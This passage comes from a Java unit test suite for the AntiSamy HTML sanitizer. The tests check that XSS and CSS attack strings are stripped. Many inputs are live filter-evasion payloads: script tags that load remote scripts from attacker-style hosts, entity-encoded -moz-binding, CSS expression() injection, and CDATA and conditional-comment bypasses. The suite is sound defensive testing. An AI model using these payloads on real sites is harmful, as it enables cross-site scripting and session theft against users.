        assertTrue(!as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.DOM).getCleanHTML().contains("script"));
        assertTrue(!as.scan("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", policy, AntiSamy.SAX).getCleanHTML().contains("script"));

        assertTrue(!as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan("<SCRIPT SRC=http://ha.ckers.org/xss.js", policy, AntiSamy.SAX).getCleanHTML().contains("<script"));

        assertTrue(!as.scan(
                        "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>",
                        policy, AntiSamy.DOM).getCleanHTML().contains("style"));
        assertTrue(!as.scan(
                        "<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>",
                        policy, AntiSamy.SAX).getCleanHTML().contains("style"));

        assertTrue(!as.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy, AntiSamy.DOM).getCleanHTML().contains("aim.exe"));
        assertTrue(!as.scan("<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>", policy, AntiSamy.SAX)
                .getCleanHTML().contains("aim.exe"));

        assertTrue(!as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy, AntiSamy.DOM).getCleanHTML().contains("javascript"));
        assertTrue(!as.scan("<!--\n<A href=\n- --><a href=javascript:alert:document.domain>test-->", policy, AntiSamy.SAX).getCleanHTML().contains("javascript"));

        assertTrue(!as.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy, AntiSamy.DOM).getCleanHTML().contains("document"));
        assertTrue(!as.scan("<a></a style=\"\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\">", policy, AntiSamy.SAX).getCleanHTML().contains("document"));
    }

    /*
     * Test CSS protections.
     */

    @Test
    public void cssAttacks() throws ScanException, PolicyException {

        assertTrue(!as.scan("<div style=\"position:absolute\">", policy, AntiSamy.DOM).getCleanHTML().contains("position"));
        assertTrue(!as.scan("<div style=\"position:absolute\">", policy, AntiSamy.SAX).getCleanHTML().contains("position"));

        assertTrue(!as.scan("<style>b { position:absolute }</style>", policy, AntiSamy.DOM).getCleanHTML().contains("position"));
        assertTrue(!as.scan("<style>b { position:absolute }</style>", policy, AntiSamy.SAX).getCleanHTML().contains("position"));

        assertTrue(!as.scan("<div style=\"z-index:25\">test</div>", policy, AntiSamy.DOM).getCleanHTML().contains("z-index"));
        assertTrue(!as.scan("<div style=\"z-index:25\">test</div>", policy, AntiSamy.SAX).getCleanHTML().contains("z-index"));

        assertTrue(!as.scan("<style>z-index:25</style>", policy, AntiSamy.DOM).getCleanHTML().contains("z-index"));
        assertTrue(!as.scan("<style>z-index:25</style>", policy, AntiSamy.SAX).getCleanHTML().contains("z-index"));
    }

    /*
     * Test a bunch of strings that have tweaked the XML parsing capabilities of
     * NekoHTML.
     */
    @Test
    public void IllegalXML() throws PolicyException {

        for (String BASE64_BAD_XML_STRING : BASE64_BAD_XML_STRINGS) {

            try {
                String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRING.getBytes()));
                as.scan(testStr, policy, AntiSamy.DOM);
                as.scan(testStr, policy, AntiSamy.SAX);

            } catch (ScanException ex) {
                // still success!
            }
        }

        // This fails due to a bug in NekoHTML
        // try {
        // assertTrue (
        // as.scan("<a . href=\"http://www.test.com\">",policy, AntiSamy.DOM).getCleanHTML().indexOf("href")
        // != -1 );
        // } catch (Exception e) {
        // e.printStackTrace();
        // fail("Couldn't parse malformed HTML: " + e.getMessage());
        // }

        // This fails due to a bug in NekoHTML
        // try {
        // assertTrue (
        // as.scan("<a - href=\"http://www.test.com\">",policy, AntiSamy.DOM).getCleanHTML().indexOf("href")
        // != -1 );
        // } catch (Exception e) {
        // e.printStackTrace();
        // fail("Couldn't parse malformed HTML: " + e.getMessage());
        // }

        try {
            assertTrue(as.scan("<style>", policy, AntiSamy.DOM) != null);
        } catch (Exception e) {
            e.printStackTrace();
            fail("Couldn't parse malformed HTML: " + e.getMessage());
        }
    }

    @Test
    public void issue12() throws ScanException, PolicyException {

        /*
         * issues 12 (and 36, which was similar). empty tags cause display
         * problems/"formjacking"
         */

        Pattern p = Pattern.compile(".*<strong(\\s*)/>.*");
        String s1 = as.scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy, AntiSamy.DOM).getCleanHTML();
        String s2 = as.scan("<br ><strong></strong><a>hello world</a><b /><i/><hr>", policy, AntiSamy.SAX).getCleanHTML();

        assertFalse(p.matcher(s1).matches());

        p = Pattern.compile(".*<b(\\s*)/>.*");
        assertFalse(p.matcher(s1).matches());
        assertFalse(p.matcher(s2).matches());

        p = Pattern.compile(".*<i(\\s*)/>.*");
        assertFalse(p.matcher(s1).matches());
        assertFalse(p.matcher(s2).matches());

        assertTrue(s1.contains("<hr />") || s1.contains("<hr/>"));
        assertTrue(s2.contains("<hr />") || s2.contains("<hr/>"));
    }

    @Test
    public void issue20() throws ScanException, PolicyException {
        String s = as.scan("<b><i>Some Text</b></i>", policy, AntiSamy.DOM).getCleanHTML();
        assertTrue(!s.contains("<i />"));

        s = as.scan("<b><i>Some Text</b></i>", policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(!s.contains("<i />"));
    }

    @Test
    public void issue25() throws ScanException, PolicyException {
        String s = "<div style=\"margin: -5em\">Test</div>";
        String expected = "<div style=\"\">Test</div>";

        String crDom = as.scan(s, policy, AntiSamy.DOM).getCleanHTML();
        assertEquals(crDom, expected);
        String crSax = as.scan(s, policy, AntiSamy.SAX).getCleanHTML();
        assertEquals(crSax, expected);
    }


    @Test
    public void issue28() throws ScanException, PolicyException {
        String s1 = as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy, AntiSamy.DOM).getCleanHTML();
        String s2 = as.scan("<div style=\"font-family: Geneva, Arial, courier new, sans-serif\">Test</div>", policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(s1.contains("font-family"));
        assertTrue(s2.contains("font-family"));
    }

    @Test
    public void issue29() throws ScanException, PolicyException {
        /* issue #29 - missing quotes around properties with spaces */
        String s = "<style type=\"text/css\"><![CDATA[P {\n	font-family: \"Arial Unicode MS\";\n}\n]]></style>";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        assertEquals(s, cr.getCleanHTML());
    }

    @Test
    public void issue30() throws ScanException, PolicyException {

        String s = "<style type=\"text/css\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>";

        as.scan(s, policy, AntiSamy.DOM);
        CleanResults cr;

        /* followup - does the patch fix multiline CSS? */
        String s2 = "<style type=\"text/css\"><![CDATA[\r\nP {\r\n margin-bottom: 0.08in;\r\n}\r\n]]></style>";
        cr = as.scan(s2, policy, AntiSamy.DOM);
        assertEquals("<style type=\"text/css\"><![CDATA[P {\n\tmargin-bottom: 0.08in;\n}\n]]></style>", cr.getCleanHTML());

        /* next followup - does non-CDATA parsing still work? */

        String s3 = "<style>P {\n\tmargin-bottom: 0.08in;\n}\n";
        cr = as.scan(s3, policy.cloneWithDirective(Policy.USE_XHTML, "false"), AntiSamy.DOM);
        assertEquals("<style>P {\n\tmargin-bottom: 0.08in;\n}\n</style>\n", cr.getCleanHTML());
    }

    @Test
    public void issue31() throws ScanException, PolicyException {

        String test = "<b><u><g>foo</g></u></b>";
        Policy revised = policy.cloneWithDirective("onUnknownTag", "encode");
        CleanResults cr = as.scan(test, revised, AntiSamy.DOM);
        String s = cr.getCleanHTML();
        assertFalse(!s.contains("&lt;g&gt;"));
        assertFalse(!s.contains("&lt;/g&gt;"));
        s = as.scan(test, revised, AntiSamy.SAX).getCleanHTML();
        assertFalse(!s.contains("&lt;g&gt;"));
        assertFalse(!s.contains("&lt;/g&gt;"));

        Tag tag = policy.getTagByLowercaseName("b").mutateAction("encode");
        Policy policy1 = policy.mutateTag(tag);

        cr = as.scan(test, policy1, AntiSamy.DOM);
        s = cr.getCleanHTML();

        assertFalse(!s.contains("&lt;b&gt;"));
        assertFalse(!s.contains("&lt;/b&gt;"));

        cr = as.scan(test, policy1, AntiSamy.SAX);
        s = cr.getCleanHTML();

        assertFalse(!s.contains("&lt;b&gt;"));
        assertFalse(!s.contains("&lt;/b&gt;"));
    }

    @Test
    public void issue32() throws ScanException, PolicyException {
        /* issue #32 - nekos problem */
        String s = "<SCRIPT =\">\" SRC=\"\"></SCRIPT>";
        as.scan(s, policy, AntiSamy.DOM);
        as.scan(s, policy, AntiSamy.SAX);
    }

    @Test
    public void issue37() throws ScanException, PolicyException {

        String dirty = "<a onblur=\"try {parent.deselectBloggerImageGracefully();}" + "catch(e) {}\""
                + "href=\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\"><img" + "style=\"FLOAT: right; MARGIN: 0px 0px 10px 10px; WIDTH: 150px; CURSOR:"
                + "hand; HEIGHT: 100px\" alt=\"\"" + "src=\"http://www.charityadvantage.com/ChildrensmuseumEaston/images/BookswithBill.jpg\""
                + "border=\"0\" /></a><br />Poor Bill, couldn't make it to the Museum's <span" + "class=\"blsp-spelling-corrected\" id=\"SPELLING_ERROR_0\">story time</span>"
                + "today, he was so busy shoveling! Well, we sure missed you Bill! So since" + "ou were busy moving snow we read books about snow. We found a clue in one"
                + "book which revealed a snowplow at the end of the story - we wish it had" + "driven to your driveway Bill. We also read a story which shared fourteen"
                + "<em>Names For Snow. </em>We'll catch up with you next week....wonder which" + "hat Bill will wear?<br />Jane";

        Policy mySpacePolicy = Policy.getInstance(getClass().getResource("/antisamy-myspace.xml"));
        CleanResults cr = as.scan(dirty, mySpacePolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());

        Policy ebayPolicy = Policy.getInstance(getClass().getResource("/antisamy-ebay.xml"));
        cr = as.scan(dirty, ebayPolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, mySpacePolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());

        Policy slashdotPolicy = Policy.getInstance(getClass().getResource("/antisamy-slashdot.xml"));
        cr = as.scan(dirty, slashdotPolicy, AntiSamy.DOM);
        assertNotNull(cr.getCleanHTML());
        cr = as.scan(dirty, slashdotPolicy, AntiSamy.SAX);
        assertNotNull(cr.getCleanHTML());
    }

    @Test
    public void issue38() throws ScanException, PolicyException {

        /* issue #38 - color problem/color combinations */
        String s = "<font color=\"#fff\">Test</font>";
        String expected = "<font color=\"#fff\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #fff\">Test 3 letter code</div>";
        expected = "<div style=\"color: rgb(255,255,255);\">Test 3 letter code</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"red\">Test</font>";
        expected = "<font color=\"red\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"neonpink\">Test</font>";
        expected = "<font>Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"#0000\">Test</font>";
        expected = "<font>Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #0000\">Test</div>";
        expected = "<div style=\"\">Test</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<font color=\"#000000\">Test</font>";
        expected = "<font color=\"#000000\">Test</font>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        s = "<div style=\"color: #000000\">Test</div>";
        expected = "<div style=\"color: rgb(0,0,0);\">Test</div>";
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getCleanHTML(), expected);
        assertEquals(as.scan(s, policy, AntiSamy.SAX).getCleanHTML(), expected);

        /*
        * This test case was failing because of the following code from the
        * batik CSS library, which throws an exception if any character
        * other than a '!' follows a beginning token of '<'. The
        * ParseException is now caught in the node a CssScanner.java and
        * the outside AntiSamyDOMScanner.java.
        *
        * 0398 nextChar(); 0399 if (current != '!') { 0400 throw new
        * ParseException("character", 0401 reader.getLine(), 0402
        * reader.getColumn());
        */
        s = "<b><u>foo<style><script>alert(1)</script></style>@import 'x';</u>bar";
        as.scan(s, policy, AntiSamy.DOM);
        as.scan(s, policy, AntiSamy.SAX);
    }

    @Test
    public void issue40() throws ScanException, PolicyException {

        /* issue #40 - handling <style> media attributes right */

        String s = "<style media=\"print, projection, screen\"> P { margin: 1em; }</style>";
        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, "true");

        CleanResults cr = as.scan(s, revised, AntiSamy.DOM);
        assertTrue(cr.getCleanHTML().contains("print, projection, screen"));

        cr = as.scan(s, revised, AntiSamy.SAX);
        assertTrue(cr.getCleanHTML().contains("print, projection, screen"));
    }

    @Test
    public void issue41() throws ScanException, PolicyException {
        /* issue #41 - comment handling */

        Policy revised = policy.cloneWithDirective(Policy.PRESERVE_SPACE, "true");

        policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "false");

        assertEquals("text ", as.scan("text <!-- comment -->", revised, AntiSamy.DOM).getCleanHTML());
        assertEquals("text ", as.scan("text <!-- comment -->", revised, AntiSamy.SAX).getCleanHTML());

        Policy revised2 = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "true").cloneWithDirective(Policy.PRESERVE_SPACE, "true").cloneWithDirective(Policy.FORMAT_OUTPUT, "false");

        /*
        * These make sure the regular comments are kept alive and that
        * conditional comments are ripped out.
        */
        assertEquals("<div>text <!-- comment --></div>", as.scan("<div>text <!-- comment --></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text <!-- comment --></div>", as.scan("<div>text <!-- comment --></div>", revised2, AntiSamy.SAX).getCleanHTML());

        assertEquals("<div>text <!-- comment --></div>", as.scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text <!-- comment --></div>", as.scan("<div>text <!--[if IE]> comment <[endif]--></div>", revised2, AntiSamy.SAX).getCleanHTML());

        /*
        * Check to see how nested conditional comments are handled. This is
        * not very clean but the main goal is to avoid any tags. Not sure
        * on encodings allowed in comments.
        */
        String input = "<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>";
        String expected = "<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>";
        String output = as.scan(input, revised2, AntiSamy.DOM).getCleanHTML();
        assertEquals(expected, output);

        input = "<div>text <!--[if IE]> <!--[if gte 6]> comment <[endif]--><[endif]--></div>";
        expected = "<div>text <!-- <!-- comment -->&lt;[endif]--&gt;</div>";
        output = as.scan(input, revised2, AntiSamy.SAX).getCleanHTML();

        assertEquals(expected, output);

        /*
        * Regular comment nested inside conditional comment. Test makes
        * sure
        */
        assertEquals("<div>text <!-- <!-- IE specific --> comment &lt;[endif]--&gt;</div>", as.scan("<div>text <!--[if IE]> <!-- IE specific --> comment <[endif]--></div>", revised2, AntiSamy.DOM).getCleanHTML());

        /*
        * These play with whitespace and have invalid comment syntax.
        */
        assertEquals("<div>text <!-- \ncomment --></div>", as.scan("<div>text <!-- [ if lte 6 ]>\ncomment <[ endif\n]--></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text  comment </div>", as.scan("<div>text <![if !IE]> comment <![endif]></div>", revised2, AntiSamy.DOM).getCleanHTML());
        assertEquals("<div>text  comment </div>", as.scan("<div>text <![ if !IE]> comment <![endif]></div>", revised2, AntiSamy.DOM).getCleanHTML());

        String attack = "[if lte 8]<script>";
        String spacer = "<![if IE]>";

        StringBuilder sb = new StringBuilder();

        sb.append("<div>text<!");

        for (int i = 0; i < attack.length(); i++) {
            sb.append(attack.charAt(i));
            sb.append(spacer);
        }

        sb.append("<![endif]>");

        String s = sb.toString();

        assertTrue(!as.scan(s, revised2, AntiSamy.DOM).getCleanHTML().contains("<script"));
        assertTrue(!as.scan(s, revised2, AntiSamy.SAX).getCleanHTML().contains("<script"));
    }

    @Test
    public void issue44() throws ScanException, PolicyException {
        /*
         * issue #44 - childless nodes of non-allowed elements won't cause an error
         */
        String s = "<iframe src='http://foo.com/'></iframe>" + "<script src=''></script>" + "<link href='/foo.css'>";
        as.scan(s, policy, AntiSamy.DOM);
        assertEquals(as.scan(s, policy, AntiSamy.DOM).getNumberOfErrors(), 3);

        CleanResults cr = as.scan(s, policy, AntiSamy.SAX);

        assertEquals(cr.getNumberOfErrors(), 3);
    }

    @Test
    public void issue51() throws ScanException, PolicyException {
        /* issue #51 - offsite URLs with () are found to be invalid */
        String s = "<a href='http://subdomain.domain/(S(ke0lpq54bw0fvp53a10e1a45))/MyPage.aspx'>test</a>";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);

        assertEquals(cr.getNumberOfErrors(), 0);

        cr = as.scan(s, policy, AntiSamy.SAX);
        assertEquals(cr.getNumberOfErrors(), 0);
    }

    @Test
    public void issue56() throws ScanException, PolicyException {
        /* issue #56 - unnecessary spaces */

        String s = "<SPAN style='font-weight: bold;'>Hello World!</SPAN>";
        String expected = "<span style=\"font-weight: bold;\">Hello World!</span>";

        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        String s2 = cr.getCleanHTML();

        assertEquals(expected, s2);

        cr = as.scan(s, policy, AntiSamy.SAX);
        s2 = cr.getCleanHTML();

        assertEquals(expected, s2);
    }

    @Test
    public void issue58() throws ScanException, PolicyException {
        /* issue #58 - input not in list of allowed-to-be-empty tags */
        String s = "tgdan <input/> g  h";
        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);
        assertTrue(cr.getErrorMessages().size() == 0);

        cr = as.scan(s, policy, AntiSamy.SAX);
        assertTrue(cr.getErrorMessages().size() == 0);
    }

    @Test
    public void issue61() throws ScanException, PolicyException {
        /* issue #61 - input has newline appended if ends with an accepted tag */
        String dirtyInput = "blah <b>blah</b>.";
        Policy revised = policy.cloneWithDirective(Policy.FORMAT_OUTPUT, "false");
        CleanResults cr = as.scan(dirtyInput, revised, AntiSamy.DOM);
        assertEquals(dirtyInput, cr.getCleanHTML());

        cr = as.scan(dirtyInput, revised, AntiSamy.SAX);
        assertEquals(dirtyInput, cr.getCleanHTML());
    }

    @Test
    public void issue69() throws ScanException, PolicyException {

        /* issue #69 - char attribute should allow single char or entity ref */

        String s = "<table><tr><td char='.'>test</td></tr></table>";
        CleanResults crDom = as.scan(s, policy, AntiSamy.DOM);
        CleanResults crSax = as.scan(s, policy, AntiSamy.SAX);
        String domValue = crDom.getCleanHTML();
        String saxValue = crSax.getCleanHTML();
        assertTrue(domValue.contains("char"));
        assertTrue(saxValue.contains("char"));

        s = "<table><tr><td char='..'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;'>test</td></tr></table>";
        assertTrue(as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;a'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));

        s = "<table><tr><td char='&quot;&amp;'>test</td></tr></table>";
        assertTrue(!as.scan(s, policy, AntiSamy.DOM).getCleanHTML().contains("char"));
        assertTrue(!as.scan(s, policy, AntiSamy.SAX).getCleanHTML().contains("char"));
    }

    @Test
    public void CDATAByPass() throws ScanException, PolicyException {
        String malInput = "<![CDATA[]><script>alert(1)</script>]]>";
        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);
        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);
        String crDom = crd.getCleanHTML();
        String crSax = crs.getCleanHTML();

        assertTrue(crd.getErrorMessages().size() > 0);
        assertTrue(crs.getErrorMessages().size() > 0);

        assertTrue(crSax.contains("&lt;script") && !crDom.contains("<script"));
        assertTrue(crDom.contains("&lt;script") && !crDom.contains("<script"));
    }

    @Test
    public void literalLists() throws ScanException, PolicyException {

        /* this test is for confirming literal-lists work as
         * advertised. it turned out to be an invalid / non-
         * reproducible bug report but the test seemed useful
         * enough to keep.
         */
        String malInput = "hello<p align='invalid'>world</p>";

        CleanResults crd = as.scan(malInput, policy, AntiSamy.DOM);
        String crDom = crd.getCleanHTML();
        CleanResults crs = as.scan(malInput, policy, AntiSamy.SAX);
        String crSax = crs.getCleanHTML();

        assertTrue(!crSax.contains("invalid"));
        assertTrue(!crDom.contains("invalid"));

        assertTrue(crd.getErrorMessages().size() == 1);
        assertTrue(crs.getErrorMessages().size() == 1);

        String goodInput = "hello<p align='left'>world</p>";
        crDom = as.scan(goodInput, policy, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(goodInput, policy, AntiSamy.SAX).getCleanHTML();

        assertTrue(crSax.contains("left"));
        assertTrue(crDom.contains("left"));
    }

    @Test
    public void stackExhaustion() throws ScanException, PolicyException {
        /*
        * Test Julian Cohen's stack exhaustion bug.
        */

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 249; i++) {
            sb.append("<div>");
        }
        /*
        * First, make sure this attack is useless against the
        * SAX parser.
        */
        as.scan(sb.toString(), policy, AntiSamy.SAX);

        /*
        * Scan this really deep tree (depth=249, 1 less than the
        * max) and make sure it doesn't blow up.
        */

        CleanResults crd = as.scan(sb.toString(), policy, AntiSamy.DOM);

        String crDom = crd.getCleanHTML();
        assertTrue(crDom.length() != 0);
        /*
        * Now push it over the limit to 251 and make sure we blow
        * up safely.
        */
        sb.append("<div><div>"); // this makes 251

        try {
            as.scan(sb.toString(), policy, AntiSamy.DOM);
            fail("DOM depth exceeded max - should've errored");
        } catch (ScanException e) {
            // An error is expected. Pass
        }
    }

    @Test
    public void issue107() throws ScanException, PolicyException {
        StringBuilder sb = new StringBuilder();

        /*
         * #107 - erroneous newlines appearing? couldn't reproduce this
         * error but the test seems worthy of keeping.
         */
        String nl = "\n";

        String header = "<h1>Header</h1>";
        String para = "<p>Paragraph</p>";
        sb.append(header);
        sb.append(nl);
        sb.append(para);

        String html = sb.toString();

        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();

        /* Make sure only 1 newline appears */
        assertTrue(crDom.lastIndexOf(nl) == crDom.indexOf(nl));
        assertTrue(crSax.lastIndexOf(nl) == crSax.indexOf(nl));

        int expectedLoc = header.length();
        int actualLoc = crSax.indexOf(nl);
        assertTrue(expectedLoc == actualLoc);

        actualLoc = crDom.indexOf(nl);
        // account for line separator length difference across OSes.
        assertTrue(expectedLoc == actualLoc || expectedLoc == actualLoc + 1);
    }

    @Test
    public void issue112() throws ScanException, PolicyException {
        TestPolicy revised = policy.cloneWithDirective(Policy.PRESERVE_COMMENTS, "true").cloneWithDirective(Policy.PRESERVE_SPACE, "true").cloneWithDirective(Policy.FORMAT_OUTPUT, "false");

        /*
        * #112 - empty tag becomes self closing
        */

        String html = "text <strong></strong> text <strong><em></em></strong> text";

        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();

        assertTrue(!crDom.contains("<strong />") && !crDom.contains("<strong/>"));
        assertTrue(!crSax.contains("<strong />") && !crSax.contains("<strong/>"));

        StringBuilder sb = new StringBuilder();
        sb.append("<html><head><title>foobar</title></head><body>");
        sb.append("<img src=\"http://foobar.com/pic.gif\" /></body></html>");

        html = sb.toString();

        Policy aTrue = revised.cloneWithDirective(Policy.USE_XHTML, "true");
        crDom = as.scan(html, aTrue, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, aTrue, AntiSamy.SAX).getCleanHTML();

        assertTrue(html.equals(crDom));
        assertTrue(html.equals(crSax));
    }


    @Test
    public void nestedCdataAttacks() throws ScanException, PolicyException {

        /*
        * Testing for nested CDATA attacks against the SAX parser.
        */

        String html = "<![CDATA[]><script>alert(1)</script><![CDATA[]>]]><script>alert(2)</script>>]]>";
        String crDom = as.scan(html, policy, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, policy, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("<script>"));
        assertTrue(!crSax.contains("<script>"));
    }

    @Test
    public void issue101InternationalCharacterSupport() throws ScanException, PolicyException {
        Policy revised = policy.cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "false");

        String html = "<b>letter 'a' with umlaut: \u00e4";
        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();
        assertTrue(crDom.contains("\u00e4"));
        assertTrue(crSax.contains("\u00e4"));

        Policy revised2 = policy.cloneWithDirective(Policy.USE_XHTML, "false").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "true");
        crDom = as.scan(html, revised2, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, revised2, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("\u00e4"));
        assertTrue(crDom.contains("&auml;"));
        assertTrue(!crSax.contains("\u00e4"));
        assertTrue(crSax.contains("&auml;"));

        Policy revised3 = policy.cloneWithDirective(Policy.USE_XHTML, "true").cloneWithDirective(Policy.ENTITY_ENCODE_INTL_CHARS, "true");
        crDom = as.scan(html, revised3, AntiSamy.DOM).getCleanHTML();
        crSax = as.scan(html, revised3, AntiSamy.SAX).getCleanHTML();
        assertTrue(!crDom.contains("\u00e4"));
        assertTrue(crDom.contains("&auml;"));
        assertTrue(!crSax.contains("\u00e4"));
        assertTrue(crSax.contains("&auml;"));
    }

    @Test
    public void iframeAsReportedByOndrej() throws ScanException, PolicyException {
        String html = "<iframe></iframe>";

        Tag tag = new Tag("iframe", Collections.<String, Attribute>emptyMap(), Policy.ACTION_VALIDATE);
        Policy revised = policy.addTagRule(tag);

        String crDom = as.scan(html, revised, AntiSamy.DOM).getCleanHTML();
        String crSax = as.scan(html, revised, AntiSamy.SAX).getCleanHTML();

        assertTrue(html.equals(crDom));
        assertTrue(html.equals(crSax));
    }

    /*
	 * Tests cases dealing with nofollowAnchors directive. Assumes anchor tags
	 * have an action set to "validate" (may be implicit) in the policy file.
	 */
    @Test
    public void nofollowAnchors() throws ScanException, PolicyException {

        // if we have activated nofollowAnchors
        Policy revisedPolicy = policy.cloneWithDirective(Policy.ANCHORS_NOFOLLOW, "true");

        // adds when not present
